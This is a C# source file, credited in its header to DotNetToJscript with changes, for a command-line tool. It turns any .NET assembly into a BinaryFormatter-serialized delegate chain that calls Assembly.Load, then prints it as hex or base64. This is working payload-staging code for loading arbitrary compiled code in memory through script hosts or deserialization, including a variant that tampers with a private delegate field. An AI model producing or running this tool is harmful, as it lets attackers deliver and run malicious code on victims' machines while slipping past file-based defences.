// Flat out pillaged from DotNetToJscript
// Modified by sussurro
//
using System;
using System.Linq;
using System.Text;
using System.IO;
using System.Reflection;
using System.Collections.Generic;
using System.Runtime.Remoting.Messaging;
using System.Runtime.Serialization.Formatters.Binary;
using System.Xml;
using System.Xml.Schema;

class Program
{

        static object BuildLoaderDelegate(byte[] assembly)
        {
            Delegate res = Delegate.CreateDelegate(typeof(XmlValueGetter),
                assembly,
                typeof(Assembly).GetMethod("Load", new Type[] { typeof(byte[]) }));

            return new HeaderHandler(res.DynamicInvoke);
        }

        static object BuildLoaderDelegateMscorlib(byte[] assembly)
        {
            Delegate res = Delegate.CreateDelegate(typeof(Converter<byte[], Assembly>),
                assembly,
                typeof(Assembly).GetMethod("Load", new Type[] { typeof(byte[]), typeof(byte[]) }));

            HeaderHandler d = new HeaderHandler(Convert.ToString);

            d = (HeaderHandler)Delegate.Combine(d, (Delegate)d.Clone());
            d = (HeaderHandler)Delegate.Combine(d, (Delegate)d.Clone());

            FieldInfo fi = typeof(MulticastDelegate).GetField("_invocationList", BindingFlags.NonPublic | BindingFlags.Instance);

            object[] invoke_list = d.GetInvocationList();
            invoke_list[1] = res;
            fi.SetValue(d, invoke_list);

            d = (HeaderHandler)Delegate.Remove(d, (Delegate)invoke_list[0]);
            d = (HeaderHandler)Delegate.Remove(d, (Delegate)invoke_list[2]);

            return d;
        }

        public static string BinToHex(byte[] serialized_object)
        {
		var sb = new StringBuilder();
        	foreach (var t in serialized_object )
        	{
            	sb.Append(t.ToString("X2"));
        	}
	
        	return sb.ToString();

        }
	
        public static string BinToBase64Lines(byte[] serialized_object)
        {
            int ofs = serialized_object.Length % 3;
            if (ofs != 0)
            {
                int length = serialized_object.Length + (3 - ofs);
                Array.Resize(ref serialized_object, length);
            }

            string base64 = Convert.ToBase64String(serialized_object, Base64FormattingOptions.None);
	    return base64;
        }

    static void Main(string[] args)
    {
	if(args.Length < 2){
		Console.WriteLine("Usage: ConvertAssembly [x|b] <filename>");
		System.Environment.Exit(0);  

	
	}
	if(! File.Exists(args[1])){
		Console.WriteLine("File does not exist");
		System.Environment.Exit(0);  

	}



                byte[] assembly = File.ReadAllBytes(args[1]);
		bool mscorlib_only = false;

                BinaryFormatter fmt = new BinaryFormatter();
                MemoryStream stm = new MemoryStream();
                fmt.Serialize(stm, mscorlib_only ? BuildLoaderDelegateMscorlib(assembly) : BuildLoaderDelegate(assembly));
		string script = "";

		if(args[0] == "b" || args[0] == "B"){
			script = BinToBase64Lines(stm.ToArray());
		} else if(args[0] == "x" || args[0] == "X"){
                	script = BinToHex(stm.ToArray());
		}else{
			Console.WriteLine("Invalid conversion type, choose X or B");
			System.Environment.Exit(0);  
			
		}

		Console.WriteLine(script);

    }
}

